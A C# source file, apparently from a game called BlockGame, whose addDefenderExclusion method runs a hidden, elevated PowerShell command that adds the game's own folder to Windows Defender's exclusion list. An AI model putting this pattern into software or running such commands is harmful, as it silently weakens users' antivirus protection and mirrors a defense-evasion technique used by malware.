using System.Diagnostics;
using BlockGame.util.log;

namespace BlockGame.main;

public partial class Game {
    public static void addDefenderExclusion() {
        try {
            var appDir = AppContext.BaseDirectory;
            var psi = new ProcessStartInfo {
                FileName = "powershell.exe",
                Arguments = $"-WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{appDir}'\"",
                Verb = "runas",
                CreateNoWindow = true,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using var process = Process.Start(psi);
            if (process != null) {
                process.WaitForExit(10000);
                if (process.ExitCode == 0) {
                    Log.info($"Added Windows Defender exclusion: {appDir}");
                }
                else {
                    Log.warn($"Failed to add Defender exclusion: exit code {process.ExitCode}");
                }
            }
        }
        catch (Exception ex) {
            Log.warn($"Failed to add Defender exclusion: {ex}");
        }
    }

    public static void cc() {
        // nothing for now!
    }
}